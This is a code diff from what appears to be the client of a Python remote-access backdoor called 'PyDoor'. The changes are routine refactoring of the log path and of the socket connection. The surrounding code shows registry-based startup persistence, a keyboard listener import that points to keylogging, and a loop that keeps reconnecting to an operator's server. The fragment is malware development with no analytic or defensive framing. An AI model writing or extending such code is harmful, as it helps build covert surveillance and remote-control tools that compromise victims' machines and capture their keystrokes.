@@ -27,15 +27,13 @@ elif __file__:
     CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))
 
 os.chdir(CLIENT_PATH)
+LOG = os.path.join(CLIENT_PATH, 'log.log')
 
 if platform.system() == 'Windows':
     import ctypes
     from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue
     from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
     STARTUP_REG_NAME = 'PyDoor'
-    LOG = os.path.join(CLIENT_PATH + '\\log.log')
-else:
-    LOG = os.path.join(CLIENT_PATH + '/log.log')
 
 try:
     from pynput.keyboard import Listener
@@ -186,17 +184,10 @@ class Client(object):
         else:
             self._pwd = '; pwd'
 
-    def socket_create(self) -> None:
-        """ Create a socket """
-        try:
-            self.socket = socket.socket()
-        except Exception as e:
-            logging.error(errors(e))
-        return
-
-    def socket_connect(self) -> None:
+    def connect(self) -> None:
         """ Connect to a remote socket using RSA and agreeing on a AES key"""
         try:
+            self.socket = socket.socket()
             self.socket.connect((self.serverHost, self.serverPort))
         except (ConnectionRefusedError, TimeoutError):
             raise
@@ -532,10 +523,9 @@ def main(RETRY_TIMER : int = 30) -> None:
     """ Run Client """
     # RETRY_TIMER: Time to wait before trying to reconnect
     client = Client()
-    client.socket_create()
     while True:
         try:
-            client.socket_connect()
+            client.connect()
         except:
             time.sleep(RETRY_TIMER)
         else:
